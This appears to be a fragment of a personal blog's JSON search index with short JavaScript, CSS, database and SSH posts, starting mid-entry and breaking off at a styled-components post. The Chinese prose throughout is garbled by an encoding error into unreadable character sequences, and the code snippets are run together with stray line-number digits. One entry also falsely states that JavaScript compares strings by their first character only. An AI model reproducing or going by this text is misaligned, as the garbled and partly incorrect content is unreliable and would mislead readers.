å·²ç¶“çœ‹å‡ºå•é¡Œçš„è©±ï¼Œå¹¹å¾—å¥½ï¼æ²’æœ‰çš„è©±ä¹Ÿæ²’é—œä¿‚ï¼Œæˆ‘å€‘ä¸€æ­¥ä¸€æ­¥ä¾†è§£æã€‚ é¦–å…ˆé€™å€‹ä½œæ³•ç•¶ç„¶æ˜¯éŒ¯çš„ï¼Œä½ å¯ä»¥è©¦è‘—æŠŠ a è·Ÿ b å°å‡ºä¾†çœ‹å°±æœƒç™¼ç¾å…©å€‹éƒ½æœƒæ˜¯ [{value: 20}]ï¼Œä½†é‡é»æ˜¯ç‚ºä»€éº¼æœƒé€™æ¨£ï¼Ÿ å¦‚æœä½ è¦çœ‹æ¯”è¼ƒè©³ç´°çš„è§£èªªï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ è©²ä¾†è«‡è«‡æ·ºæ‹·è²ï¼ˆShallow copyï¼‰èˆ‡æ·±æ‹·è²ï¼ˆDeep copyï¼‰äº†ï¼Œé€™é‚Šåªæœƒå¤§æ¦‚è¬›ä¸€ä¸‹åŸå› ã€‚ ç°¡å–®ä¾†èªªï¼Œç•¶æˆ‘ç”¨ [...a] çš„æ™‚å€™ï¼Œä½ å¯ä»¥æŠŠæˆ‘è¤‡è£½å‡ºä¾†çš„æ±è¥¿æƒ³æˆæ˜¯é€™æ¨£ï¼š 1const b = [reference] æ‰€ä»¥å¦‚æœä½ é€™æ™‚å€™ç”¨ b[0] === a[0]ï¼Œç­”æ¡ˆå°±æœƒæ˜¯ trueï¼Œå› ç‚ºä»–å€‘æ˜¯åŒå€‹ referenceã€‚é€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼ b[0].value = 20 ä¹Ÿæœƒæ”¹åˆ° a çš„åŸå› ã€‚ é›–ç„¶ç¾åœ¨è¬›çš„å¾ˆæœ‰æŠŠæ¡ï¼Œä¸éç•¶ä¸‹é‚„çœŸçš„è »ç–‘æƒ‘ç‚ºä»€éº¼æœƒæœ‰é€™æ¨£çš„çµæœã€‚ æ­£ç¢ºçš„åšæ³•ç¸½è€Œè¨€ä¹‹ï¼Œæ­£ç¢ºçš„åšæ³•å°±æ˜¯é¿å…æ‰æ·ºæ‹·è²å¸¶ä¾†çš„å•é¡Œï¼Œæ‰€ä»¥æœ‰å…©ç¨®æ–¹å¼ï¼Œå…ˆä¾†çœ‹ç¬¬ä¸€ç¨®ï¼š 123456const a = [{value: 10}]const b = JSON.parse(JSON.stringify(a))b[0].value = 20console.log(a) // [{value: 10}]console.log(b) // [{value: 20}] ç¬¬äºŒç¨®ï¼š 1234567const a = [{value: 10}]const b = a.map(item =&gt; { return {...item, value: 20}})console.log(a)console.log(b) ç¬¬ä¸€ç¨®æ˜¯åˆ©ç”¨ JSON è½‰æ›çš„æ–¹å¼ï¼Œç¬¬äºŒç¨®æ˜¯å…ˆåˆ©ç”¨ map éæ­· Objectï¼Œæ¯ä¸€åœˆéƒ½åšæ·ºæ‹·è²ï¼ˆå› ç‚ºåªæœ‰ä¸€å±¤æ‰€ä»¥ä¸æœƒæ˜¯ referenceï¼‰ï¼Œå†æŠŠè¦æ”¹çš„éƒ¨åˆ†ä¿®æ­£ã€‚ å…©ç¨®æ–¹æ³•å…¶å¯¦éƒ½è¡Œï¼Œä¸éæˆ‘æ˜¯è½èªªç¬¬ä¸€ç¨®æœƒæœ‰æ•ˆèƒ½å•é¡Œï¼Œæ‰€ä»¥é‚„æ˜¯éƒ½ç”¨ç¬¬äºŒç¨®å±…å¤šã€‚","link":"/2022/06/14/shallow-and-deep-copy-problem/"},{"title":"è©²ä¾†è«‡è«‡æ·ºæ‹·è²ï¼ˆShallow copyï¼‰èˆ‡æ·±æ‹·è²ï¼ˆDeep copyï¼‰äº†","text":"ä»¥å‰æ²’æœ‰æƒ³éæˆ‘æœƒè¢«é€™å€‹æ±è¥¿çµ¦é›·åˆ°ã€‚ ç°¡è¿°åœ¨è«‡é€™å…©å€‹æ±è¥¿ä»¥å‰ï¼Œå…ˆä¾†èŠèŠæˆ‘æ˜¯æ€éº¼è¸©åˆ°é€™å€‹åœ°é›·çš„å§ã€‚ é€™æ˜¯æˆ‘ç•¶åˆåœ¨åšã€Œäº”å­æ£‹ã€çš„æ™‚æ‰€ç™¼ç”Ÿçš„æƒ…å¢ƒï¼š ç‚ºäº†å„²å­˜æ£‹ç›¤çš„ç‹€æ…‹ï¼Œæˆ‘é–‹äº†ä¸€å€‹åƒé€™æ¨£çš„è³‡æ–™çµæ§‹ï¼š 1234567const pieces = [ [null, null, null, null, ...], [null, null, null, null, ...], [null, null, null, null, ...], [null, null, null, null, ...], ...] ç°¡å–®ä¾†èªªå°±æ˜¯ä¸€å€‹ç”¨ä¾†è¡¨ç¤º 19 x 19 æ£‹ç›¤çš„äºŒç¶­é™£åˆ—ï¼Œç¬¬ä¸€å±¤ä»£è¡¨ y è»¸ï¼Œç¬¬äºŒå±¤ä»£è¡¨ x è»¸ï¼Œæ‰€ä»¥ pieces[0][0] ä»£è¡¨ç¬¬ä¸€æ’çš„ç¬¬ä¸€æ”¯æ£‹ï¼Œpiecesp[1][0] ä»£è¡¨ç¬¬äºŒæ’çš„ç¬¬ä¸€æ”¯æ£‹ï¼Œä»¥æ­¤é¡æ¨ã€‚ ç•¶æ™‚è¦åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œå°±æ˜¯åœ¨ä¸‹æ£‹æ™‚æ ¹æ“šã€Œè¢«é»æ“Šçš„åº§æ¨™ä½ç½®ã€ä¾†æ›´æ–° stateã€‚ æœƒè¬› state é€™å€‹è©å°±æš—ç¤ºæˆ‘ç•¶æ™‚æ˜¯ç”¨ React ä¾†å¯«çš„ï¼Œæ‰€ä»¥ä¸¦ä¸èƒ½ç”¨é€™ç¨® piecesp[y][x] çš„æ–¹å¼ä¾†æ”¹ï¼Œè€Œæ˜¯å¾—ç”¢ç”Ÿä¸€å€‹æ–°çš„ state æ‰è¡Œã€‚ æ‰€ä»¥ï¼Œæœ€ç°¡å–®çš„ä½œæ³•å°±æ˜¯å…ˆè¤‡è£½ä¸€ä»½åŸæœ¬çš„é™£åˆ—ï¼Œå†æŠŠè¦æ”¹çš„åœ°æ–¹æ”¹æ‰å°±å¥½ï¼Œçµæœæˆ‘å°±å¯«äº†é€™ç©æ„å…’ï¼š 123456// è¤‡è£½ä¸€ä»½åŸæœ¬çš„é™£åˆ—const newPieces = pieces.slice();// æ”¹æˆé»‘æ£‹æˆ–ç™½æ£‹çš„ç‹€æ…‹newPieces[changedY][changedX] = isBlackNext ? \"black\" : \"white\";// æ›´æ–° statesetPieces(newPieces); æ¥è‘—å°±å‡ºç¾äº†é€™å¹…è©­ç•°çš„ç¾è±¡ï¼š ç•¶æ™‚çš„æˆ‘æ„Ÿåˆ°æ‡·ç–‘äººç”Ÿï¼Œæ˜æ˜æˆ‘çµ¦çš„åº§æ¨™å°±æ˜¯ newPieces[0][18]ï¼ˆæœ€å³ä¸Šè§’ï¼‰ï¼Œæ€éº¼æœƒæ‰€æœ‰çš„ newPieces[n][18]ï¼ˆæ•´å€‹ç›´æ’ï¼‰ éƒ½ä¸€èµ·æ”¹è®Šäº†ï¼Ÿ æ‰¾äº†åŠå¤©æ‰¾ä¸åˆ°åŸå› ï¼Œç”šè‡³å¾Œä¾†ç›´æ¥æŠŠå€¼å¯«æ­»ä¾†æ¸¬è©¦ï¼Œä½†é‚„æ˜¯å¾—åˆ°ä¸€æ¨£çš„çµæœï¼Œæ•´å€‹äººéƒ½ä¸å¥½äº†ï¼ˆX ç›´åˆ°å¾Œä¾†æŸ¥äº†ä¸€äº›è³‡æ–™ä»¥å¾Œï¼Œæˆ‘æ‰ç†è§£åŸä¾†æ˜¯ã€Œæ·ºæ‹·è²ã€åœ¨èƒŒå¾Œä½œæ€ªã€‚ æ·ºæ‹·è²èˆ‡æ·±æ‹·è²çš„å·®åˆ¥åœ¨è¬›å·®åˆ¥ä¹‹å‰ï¼Œæˆ‘å€‘å¯ä»¥å…ˆä¾†çœ‹ä¸€ä¸‹æ·ºæ‹·è²çš„ç¯„ä¾‹ï¼Œç†è§£å®ƒæœƒç”¢ç”Ÿä»€éº¼å•é¡Œï¼š 12345678const array = ['A', 'B', ['C']];// æœ€ç°¡æ½”çš„æ·ºæ‹·è²ï¼ˆå±•é–‹é‹ç®—å­ï¼‰const copyArray = [...array]; // å¯ä»¥æƒ³æˆæ˜¯æŠŠ 'A', 'B', ['C'] æ”¾åˆ° [] è£¡// æ¥è‘—æŠŠå·¢ç‹€çš„éƒ¨åˆ†æ›´æ–°copyArray[2][0] = 'Z';console.log(copyArray); // ['A', 'B', ['Z']];console.log(array); // ??? ä¸äº†è§£æ·ºæ‹·è²çš„è©±å°±æœƒå¾ˆç›´è¦ºçš„èªªï¼š ã€Œç•¶ç„¶æ˜¯ ['A', 'B', ['C']] å‘€ï¼ã€ å¯æ˜¯çœŸçš„æ˜¯é€™æ¨£å—ï¼Ÿå…¶å¯¦æ­£ç¢ºç­”æ¡ˆæ˜¯ï¼š['A', 'B', ['Z']] å¦‚æœä½ è©¦è‘—æŠŠé€™å…©å€‹å€¼åšæ¯”å°çš„è©±ï¼Œå°±æœƒç™¼ç¾çµæœå‡ºä¹æ„æ–™ï¼š 1console.log(copyArray[2] === array[2]); // true è¦è¨˜å¾—åƒ Array æˆ– Object é€™ç¨® non-primitive çš„è®Šæ•¸å„²å­˜çš„éƒ½æ˜¯ã€ŒReferenceã€ï¼Œä¸æ˜¯çœŸæ­£çš„å€¼ï¼Œæ‰€ä»¥ç•¶ä½ å»æ”¹å…©å€‹æŒ‡å‘åŒä¸€å€‹ reference çš„è®Šæ•¸ï¼Œç•¶ç„¶å°±æœƒå…©å€‹ä¸€èµ·æ”¹è®Šã€‚ å¥½åƒæ‹‰å¾—æœ‰é»é ï¼Œæ‰€ä»¥èƒ½å‘Šè¨´æˆ‘æ·ºæ‹·è²æ˜¯ä»€éº¼äº†å—ï¼Ÿ æ·ºæ‹·è²å°±æ˜¯åªèƒ½è¤‡è£½ç¬¬ä¸€å±¤çš„é™£åˆ—æˆ–ç‰©ä»¶ æ·ºæ‹·è²å°±æ˜¯åªèƒ½è¤‡è£½ç¬¬ä¸€å±¤çš„é™£åˆ—æˆ–ç‰©ä»¶ æ·ºæ‹·è²å°±æ˜¯åªèƒ½è¤‡è£½ç¬¬ä¸€å±¤çš„é™£åˆ—æˆ–ç‰©ä»¶ ä»¥å‰›å‰›çš„ä¾‹å­ä¾†èªªï¼Œå¦‚æœä½ é€™æ¨£å­åšï¼š 12console.log(copyArray === array) // falseconsole.log(copyArray[2] === array[2]) // true æœƒç™¼ç¾å¦‚æœåªæ¯”è¼ƒç¬¬ä¸€å±¤çš„é™£åˆ—ï¼Œå¾—åˆ°çš„çµæœæœƒæ˜¯ falseï¼Œä»£è¡¨å…©å€‹æ±è¥¿æ˜¯ä¸ä¸€æ¨£çš„ï¼Œå› ç‚ºæ·ºæ‹·è²æœ¬ä¾†å°±å¯ä»¥è¤‡è£½ã€Œç¬¬ä¸€å±¤ã€çš„æ±è¥¿ã€‚ä½†å¦‚æœæ˜¯ç¬¬äºŒå±¤çš„è©±å°±æ²’è¾¦æ³•äº†ï¼Œå®ƒé‚„æ˜¯æœƒæŒ‡å‘åŒä¸€å€‹ Referenceï¼Œæ‰€ä»¥ç¬¬äºŒå€‹çµæœæ‰æœƒæ˜¯ trueã€‚ æ€éº¼åˆ†è¾¨æ·ºæ‹·è²èˆ‡æ·±æ‹·è²ï¼Ÿé€™éƒ¨åˆ†å°±è¦é ä½ è‡ªå·±æœå°‹äº†ï¼ŒGoogle ä¸€ä¸‹å°±è »å¤šç­”æ¡ˆäº†ï¼Œç¸½ä¹‹å¤§éƒ¨åˆ†ä½ å¸¸ç”¨çš„ sliceã€map æˆ– ... éƒ½å±¬æ–¼æ·ºæ‹·è²ã€‚ è€Œæ·±æ‹·è²å› ç‚ºé‚„è »éº»ç…©çš„ï¼Œæ‰€ä»¥å¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£æ²’è¢«é›·éçš„è©±å¯èƒ½æ ¹æœ¬æ²’ç”¨éæ·±æ‹·è²é€™ç©æ„å…’ã€‚ ç¸½ä¹‹å‘¢ï¼Œæ·±æ‹·è²å¤§å¤šæ•¸æœƒä¾è³´å¥—ä»¶ä¾†åšï¼Œå› ç‚ºå®ƒæ¯”è¼ƒè¤‡é›œä¸€é»ï¼Œé€™é‚Šéš¨ä¾¿è²¼å¹¾å€‹æˆ‘åœ¨ç¶²è·¯ä¸Šæ‰¾åˆ°çš„ç¯„ä¾‹ï¼š 1. é€é jQuery çš„ $.extendï¼š 123456789let obj = {name: 'ç‹åº·å¯¶', age:{child: 18}}let copy = $.extend(true, {}, obj); //ä½¿ç”¨ jquery.extendcopy.name = 'ç›§å¡æ–¯';copy.age.child = 99; //æ›´æ”¹ copy.age.child çš„å€¼//è¼¸å‡ºconsole.log(obj); //{name: \"ç‹åº·å¯¶\", age:{child: 18}}console.log(copy); //{name: \"ç›§å¡æ–¯\", age:{child: 99}} 2. ç”¨ lodashï¼ˆä¹Ÿæ˜¯æŸå€‹å¥—ä»¶ï¼‰ 123456789let obj = {name: 'ç‹åº·å¯¶', age:{child: 18}}let copy = _.cloneDeep(obj); //ä½¿ç”¨ lodash.cloneDeepcopy.name = 'ç›§å¡æ–¯';copy.age.child = 99; //æ›´æ”¹ copy.age.child çš„å€¼//è¼¸å‡ºconsole.log(obj); //{name: \"ç‹åº·å¯¶\", age:{child: 18}}console.log(copy); //{name: \"ç›§å¡æ–¯\", age:{child: 99}} æœ€å¾Œæ˜¯ä¸€å€‹ç´” JavaScript çš„æ–¹å¼ï¼Œå°±æ‹¿æˆ‘å€‘å‰›å‰›çš„ç¯„ä¾‹ä¾†åšå§ï¼š 12345678const array = ['A', 'B', ['C']];const copyArray = JSON.parse(JSON.stringify(array));copyArray[2][0] = 'Z'; // æ›´æ–°å€¼console.log(copyArray); // ['A', 'B', ['Z']]console.log(array); // ['A', 'B', ['C']]console.log(array[2] === copyArray[2]); // false é€™æ–¹æ³•é‚„è »å¦™çš„ï¼Œä¸éè¦æ³¨æ„æ²’è¾¦æ³•ç”¨å…§å®¹æœ‰ function çš„å€¼ï¼Œè€Œä¸”æ•ˆèƒ½ä¹Ÿä¸æ˜¯é‚£éº¼å¥½ã€‚ æœ€å¾Œçš„æœ€å¾Œæ‰€ä»¥å›åˆ°ä¸€é–‹å§‹äº”å­æ£‹çš„ä¾‹å­ï¼Œç‚ºä»€éº¼åœ¨æˆ‘é»äº† newPieces[0][18] ä»¥å¾ŒæœƒæŠŠæ‰€æœ‰çš„ newPieces[n][18] çµ¦æ›´æ–°ï¼Ÿ ä¸å¦‚ç›´æ¥å¯«å€‹ç¯„ä¾‹ä¾†æ¸¬è©¦å§ï¼š 12345678910111213const array = [ [null, null, null, null, null, null, null, null, null, null], [null, null, null, null, null, null, null, null, null, null], [null, null, null, null, null, null, null, null, null, null], [null, null, null, null, null, null, null, null, null, null],];const shallowCopy = [...array];// æŠŠç¬¬ä¸€æ’æœ€å¾Œé¢çš„å€¼æ”¹æ‰shallowCopy[0][9] = 'black';console.log(shallowCopy);console.log(array); çµæœå°±æœƒç™¼ç¾å…©å€‹ array çš„ç¬¬ä¸€æ’æœ€å¾Œä¸€å€‹å€¼éƒ½åŒæ™‚è¢«æ”¹äº†ã€‚ é€™é‚Šè¦å…ˆæé†’ï¼Œæˆ‘å€‘åœ¨ React è£¡è¤‡è£½åŸæœ¬çš„ state å¦‚æœæ˜¯æ·ºæ‹·è²ï¼Œä»£è¡¨æ”¹æ±è¥¿çš„è©±ä¹Ÿæœƒå‹•åˆ°åŸæœ¬çš„ stateã€‚ é€™å¯éº»ç…©å¤§äº†ï¼Œç•¢ç«Ÿ React éå¸¸å¼·èª¿ state æ˜¯ã€ŒImmutableï¼ˆä¸å¯ä»¥è®Šï¼‰ã€çš„ï¼Œæ‰€ä»¥å»å‹•åˆ°åŸæœ¬çš„ state çµ•å°æœƒæœ‰ä¸€äº›å•é¡Œã€‚ é›–ç„¶æˆ‘é‚„ä¸æ˜ç¢ºçŸ¥é“å¯¦éš›ç™¼ç”Ÿäº†ä»€éº¼ï¼Œä½†è‡³å°‘çŸ¥é“ç•¶æˆ‘å€‘ç”¨æ·ºæ‹·è²æ™‚ï¼Œæœƒæ”¹åˆ°åŸæœ¬çš„ stateï¼Œå› æ­¤ä¸€å®šæœƒç”¢ç”Ÿä¸€äº›å•é¡Œï¼Œå…ˆçŸ¥é“é€™äº›å°±å¤ äº†ã€‚ é™„è¨»å¾Œä¾†æˆ‘ç™¼ç¾ä¸Šé¢çš„è¬›æ³•æ˜¯éŒ¯çš„ï¼Œå¯¦éš›çš„å•é¡Œè·Ÿæ”¹äº† React çš„ state æ²’æœ‰å¤ªå¤§é—œé€£ï¼Œè€Œæ˜¯å› ç‚º Array.prototpye.fill é€™å€‹å…§å»ºå‡½å¼å¼•èµ·çš„å•é¡Œã€‚ é¦–å…ˆå‘¢ï¼Œæ ¹æ“š MDN çš„èªªæ˜ï¼š ç•¶ fill æ–¹æ³•ç²å¾—ä¸€å€‹å‚³å…¥çš„ç‰©ä»¶ï¼Œæœƒå°‡å‚³å…¥çš„ç‰©ä»¶ä½ç½®é€²è¡Œè¤‡è£½ï¼Œä¸¦æŠŠå…¶åƒè€ƒå€¼ï¼ˆreferenceï¼‰ä¹‹æ‹·è²å¡«å…¥é™£åˆ—ä¸­ã€‚ æ„æ€å°±æ˜¯èªªå¦‚æœä½  fill è£¡é¢æ”¾çš„æ˜¯å±¬æ–¼ã€ŒObjectã€çš„æ±è¥¿ï¼Œé‚£ç”¢ç”Ÿå‡ºçš„å€¼éƒ½æ˜¯ Referenceï¼Œä¸æ˜¯å„è‡ªç¨ç«‹çš„å€¼ï¼Œèˆ‰å€‹ä¾‹å­ï¼š 123var arr = Array(5).fill(null) // [null, null, ...]var arr2 = Array(5).fill(arr) // [[null, null, ...], ...]arr2[0].push(\"TEST\"); é€™é‚Šå…ˆç”¨ fill ç”¢ç”Ÿäº†äºŒç¶­é™£åˆ—ï¼Œæ¥è‘—å†å°äºŒç¶­é™£åˆ—è£¡çš„ç¬¬ä¸€å€‹é™£åˆ— push ä¸€å€‹æ–°çš„å€¼ï¼Œä¾ç…§å¸¸ç†æœƒèªç‚ºåªæœ‰ç¬¬ä¸€å€‹æœƒæ–°å¢ï¼Œä½†çµæœå»æ˜¯ï¼š 1234567[ [null, null, null, null, null, \"TEST\"], [null, null, null, null, null, \"TEST\"], [null, null, null, null, null, \"TEST\"], [null, null, null, null, null, \"TEST\"], [null, null, null, null, null, \"TEST\"],]; é€™å°±ä¸Šé¢æåˆ°çš„ referenceï¼Œä¸ç®¡æ˜¯ arr2[0]ã€arr[1] é‚„æ˜¯ arr[2]ï¼Œå®ƒå€‘æŒ‡å‘çš„éƒ½æ˜¯åŒä¸€å€‹ referenceï¼Œé€™å°±æ˜¯ç‚ºä»€éº¼æ˜æ˜åªæ”¹äº†ä¸€å€‹ï¼Œå»æ¯å€‹éƒ½è¢«æ”¹è®Šäº†çš„åŸå› ã€‚","link":"/2022/04/16/shallow-copy-and-deep-copy/"},{"title":"é‚è¼¯é‹ç®—ä¸­çš„çŸ­è·¯","text":"ä½ è…¦è¢‹çŸ­è·¯äº†å—ï¼Ÿ çŸ­è·¯çš„å®Œæ•´æ„æ€æ˜¯ã€ŒçŸ­è·¯æ±‚å€¼ï¼ˆShort-circuit evaluationï¼‰ã€ã€‚ ç°¡å–®ä¾†èªªï¼Œå¦‚æœå¾ç¬¬ä¸€å€‹å€¼å°±å¯ä»¥çŸ¥é“çµæœï¼Œé‚£å°±ä¸ç”¨å†ç®¡ç¬¬äºŒå€‹çš„å€¼æ˜¯ä»€éº¼ã€‚ OR çš„çŸ­è·¯é‹ç®—123console.log(3 || 0) // 3 console.log(0 || 3) // 3true || console.log('123') // log ä¸æœƒè¢«åŸ·è¡Œ 3 || 0 æ™‚ï¼Œ3 å°±å¯ä»¥æ±ºå®šçµæœï¼Œæ‰€ä»¥ä¸æœƒç®¡å¾Œé¢çš„ 00 || 3 æ™‚ï¼Œ0 é‚„ä¸èƒ½æ±ºå®šçµæœï¼Œæ‰€ä»¥çœ‹ç¬¬äºŒå€‹å€¼ 3ï¼Œæœ€å¾Œé€šéæ‰€ä»¥å›å‚³true || console.log('123') æ™‚ï¼Œtrue å°±å¯ä»¥æ±ºå®šçµæœï¼Œæ‰€ä»¥ log ä¸æœƒè¢«åŸ·è¡Œ AND çš„çŸ­è·¯é‹ç®—123console.log(0 &amp;&amp; 10) // 0console.log(10 &amp;&amp; 0) // 0console.log(10 &amp;&amp; 30) // 30 è·Ÿ OR çš„æƒ…æ³ä¸€æ¨£ï¼Œè‡ªå·±æƒ³æƒ³çœ‹ç‚ºä»€éº¼ã€‚","link":"/2021/12/17/short-circuit-logic/"},{"title":"ä¸€äº›åœ¨æ‰‹æ©Ÿä¸Š CSS çš„å°ç´°ç¯€","text":"æ…¢æ…¢ç´¯ç©é€™ç¯‡æ–‡ç« çš„å…§å®¹ã€‚ ç°¡è¿°é€™ç¯‡é æœŸæœƒæŠŠä¹‹å¾Œç¢°åˆ°çš„å•é¡Œéƒ½å¯«åœ¨é€™ï¼Œå¸Œæœ›èƒ½è§£æ±ºå¯« RWD æ™‚çš„åœ°é›·ã€‚ åœ¨ IOS ä¸Šçš„ &lt;button&gt; çš„å­—é«”è·Ÿè‰²å½©èˆ‡çœ¾ä¸åŒï¼Œå»ºè­°åŠ ä¸Šé€™å…©å€‹ï¼š 12font-family: inherit;font-size: inherit; åœ¨æ‰‹æ©Ÿæ¿ä¸Šçš„ &lt;input&gt; è¦ç‰¹åˆ¥æ³¨æ„æ–‡å­—å¤§å°ï¼Œå¦‚æœ &lt;16px å°±æœƒåœ¨ :focus æ™‚è‡ªå‹•ç¸®æ”¾ï¼ˆZoomï¼‰ï¼Œå»ºè­°åŠ ä¸Šï¼š 1font-size: 1em; å¦‚æœæƒ³è®“ &lt;input&gt; æœ‰ :focus é‚Šæ¡†åŠ æ·±æ•ˆæœï¼Œå»ºè­°ç”¨ box-shadow ä¾†è¨­ï¼š 1234input:focus { outline: 0; box-shadow: 0 0 0 1px blue; } é€™æ¨£å­åšå¯ä»¥é¿å… outline åœ¨ä¸åŒç€è¦½å™¨ä¸Šçš„æ¨£å¼å•é¡Œã€‚é‚„æœ‰åœ“è§’ bugã€‚","link":"/2022/04/12/some-css-detail-on-mobile/"},{"title":"é—œè¯å¼èˆ‡éé—œè¯å¼è³‡æ–™åº«","text":"ä»¥å‰è½çš„å¾ˆäº‚çš„æ±è¥¿ã€‚ é—œè¯å¼é—œè¯å¼çš„æ ¸å¿ƒç†å¿µï¼šä¸è¦æŠŠä¸ç›¸å¹²çš„è³‡æ–™æ”¾åœ¨ä¸€èµ· è™•ç†é—œè¯å¼è³‡æ–™åº«çš„ç¨‹å¼èªè¨€ï¼šSQLï¼ˆStructure Query Languageï¼‰ æœ€æœ‰åçš„ä»£è¡¨ï¼šMySQL èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘æœ‰ä¸€å€‹ç”¨ä¾†å„²å­˜æœŸä¸­è€ƒåˆ†æ•¸çš„ tableï¼š ç”¨çœ‹çš„å°±æœ‰é»å¥‡æ€ªå§ï¼Ÿç‚ºä»€éº¼è¦æŠŠå§“åè·Ÿåœ°å€ä¹Ÿæ”¾åœ¨é€™å€‹ table è£¡é¢ï¼Ÿ è€Œä¸”å‡è¨­ä¹‹å¾Œåˆæœ‰ä¸€å€‹æ–°çš„ table æ˜¯å„²å­˜æœŸæœ«è€ƒåˆ†æ•¸ï¼Œä¸å°±åˆè¦åœ¨æ‰“ä¸€æ¬¡å§“åè·Ÿåœ°å€ï¼Ÿ æ‰€ä»¥èˆ‡å…¶é€™æ¨£å­åšï¼Œå€’ä¸å¦‚é–‹ä¸€å€‹æ–°çš„ table å°ˆé–€ç”¨ä¾†å„²å­˜ã€Œå­¸ç”Ÿè³‡æ–™ã€ï¼š é‚£è¦æ€éº¼æŠŠã€ŒæœŸä¸­è€ƒã€è·Ÿã€Œå­¸ç”Ÿè³‡æ–™ã€é—œè¯åœ¨ä¸€èµ·ï¼Ÿæ³¨æ„åˆ°äº†å—ï¼Œé€™å…©å€‹ table éƒ½æœ‰ã€Œå­¸è™Ÿã€ï¼Œæ‰€ä»¥ç”¨å­¸è™Ÿå°±å¯ä»¥æŠŠå®ƒå€‘é—œè¯èµ·ä¾†ã€‚ é€™å°±æ˜¯é—œè¯å¼è³‡æ–™åº«çš„æ ¸å¿ƒç†å¿µï¼šæŠŠä¸é‡è¦çš„åˆ†é–‹ä¾†ï¼Œåœ¨é€éæŸå€‹æ¬„ä½ä¾†æŠŠä¸åŒçš„è³‡æ–™åº«çµ¦é—œè¯èµ·ä¾†ã€‚ éé—œé€£å¼çµ±ç¨±ï¼šNOSQLï¼ˆNot Only SQLï¼‰ æœ€æœ‰åçš„ä»£è¡¨ï¼šMongoDB å¤§æ¦‚æ˜¯å€‹æœ‰é»åƒ JSON çš„æ±è¥¿ï¼š 123456{ score: [1, 2, 3], student: { name: 'PeaNu', }} å¥½è™•æ˜¯å¦‚æœä»Šå¤©æƒ³æ–°å¢æ¬„ä½å¯ä»¥ç›´æ¥åŠ é€²å»ï¼š 123456789{ score: [1, 2, 3], student: { name: 'PeaNu', }, address: { 'northern': 'Taipie' }} å¦‚æœæ˜¯é—œè¯å¼è³‡æ–™åº«å°±å¾—é‡æ–°èª¿æ•´ã€ŒSchemaï¼ˆçµæ§‹ï¼‰ã€ï¼Œæœƒæ¯”è¼ƒéº»ç…©ä¸€é»ã€‚","link":"/2022/01/30/sql-and-nosql/"},{"title":"SSH ç”¨åˆ¥åçš„æ–¹å¼ä¾†é€£ç·š","text":"æ‡¶äººåŒ…ã€‚ ç°¡è¿°åˆ° ~~/.ssh/ åº•ä¸‹é–‹ä¸€å€‹ configï¼š 12345Host peanu # è¨­å®šçš„åˆ¥åHostName 127.0.0.1 # IP ä½å€User ubuntu # ç™»å…¥çš„ä½¿ç”¨è€…åç¨±IdentitiesOnly yes # å›ºæœ‰é…ç½®IdentityFile &lt;path&gt; # ç§é‘°è·¯å¾‘ å°±é€™æ¨£ã€‚","link":"/2022/03/09/ssh-alias/"},{"title":"å­—å…ƒæ˜¯å¯ä»¥æ¯”å¤§å°çš„","text":"å¥½åƒæ˜¯å†·çŸ¥è­˜ã€‚ åŸç†æ¯å€‹å­—å…ƒéƒ½æœ‰å°æ‡‰çš„ ASCII ç¢¼ï¼Œæ‰€ä»¥èƒŒå¾Œæ˜¯ç”¨é€™å€‹ç¢¼ä¾†æ¯”å¤§å°çš„ã€‚ 123console.log('@'.charCodeAt(0)) // 64console.log('!'.charCodeAt(0)) // 33console.log('@' &gt; '!') // true æ¯”æ¯”çœ‹1234const str1 = 'A' // 65const str2 = 'B' // 66 console.log(str1 &gt; str2) // falseconsole.log(str1 &lt; str2) // true å¦‚æœæ˜¯å­—ä¸²çš„è©±ï¼Œåªæœƒçœ‹ç¬¬ä¸€å€‹å­—å…ƒï¼š 1234const str1 = 'AJDSJOIDJOJS' // A =&gt; 65const str2 = 'BADKAIJSOIDJ' // B =&gt; 66console.log(str1 &gt; str2) // falseconsole.log(str1 &lt; str2) // true ç”¨é€™å€‹æ–¹å¼ä¾†è½‰æ›å¤§å°å¯«12345678910const str = 'AbCdEFGhijkLMN'var result = ''for(var i=0; i&lt;str.length; i++) { if(str[i]&gt;='A' &amp;&amp; str[i]&lt;='Z') { result += String.fromCharCode(str[i].charCodeAt(0) + 32) } else { result += str[i] }}console.log(result) // abcdefghijklmn å…¶å¯¦å°±è·Ÿç”¨ ASCII ç¢¼çš„ä½œæ³•ä¸€æ¨£ï¼Œåªæ˜¯é€™æ¨£çš„å¯è®€æ€§æ›´å¥½è€Œå·²ã€‚","link":"/2021/12/20/string-can-be-calculate/"},{"title":"æŠŠå­—ä¸²è½‰æˆæ•¸å­—çš„ 4 ç¨®æ–¹æ³•","text":"å¥½å¤šå¥½å¤šã€‚ Number.parseInt(str, radix)æœ€æ­£è¦çš„æ–¹å¼ï¼Œradix ä»£è¡¨ç”¨å¹¾é€²ä½ä¾†è§£æé€™å€‹å­—ä¸²ï¼ˆNumber å¯åŠ å¯ä¸åŠ ï¼‰ï¼š 1234const a = Number.parseInt('123', 10)const b = Number.parseInt('100', 2)console.log(a) // 123console.log(b) // 4 Math.floor(str)å…¶å¯¦ Math.ceil ä¹Ÿå¯ä»¥ï¼Œä½†å€‹äººè¦ºå¾— floor æ¯”è¼ƒç›´è¦ºï¼š 12const a = Math.floor('123')console.log(a) // 123 å­—ä¸² * 1è·Ÿã€Œæ•¸å­— + ç©ºå­—ä¸²ã€æœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ï¼š 12const a = '123' * 1console.log(a) // 123 å¾ˆé©åˆç”¨åœ¨ä½ ä¸æƒ³ç”¨æ‹¬è™ŸåŒ…ä¸€å¤§ä¸²æ±è¥¿çš„æ™‚å€™ï¼š 12let a = '1991 11 7'.split(' ').reduce((acc, elem) =&gt; acc + elem, '') * 1console.log(a) // 19911117 Number(str)æœ€ç›´è¦ºçš„åšæ³•ï¼š 12const a = Number('123')console.log(a) // 123","link":"/2021/12/27/string-to-number/"},{"title":"Styled-components åŸºç¤","text":"æœ‰ç¨®ç”¨äº†å°±å›ä¸å»çš„æ„Ÿè¦ºã€‚ styled component ä¸­çš„ propsæ—¢ç„¶å®ƒæ˜¯ Componentï¼Œé‚£ç•¶ç„¶ä¹Ÿæœ‰ props 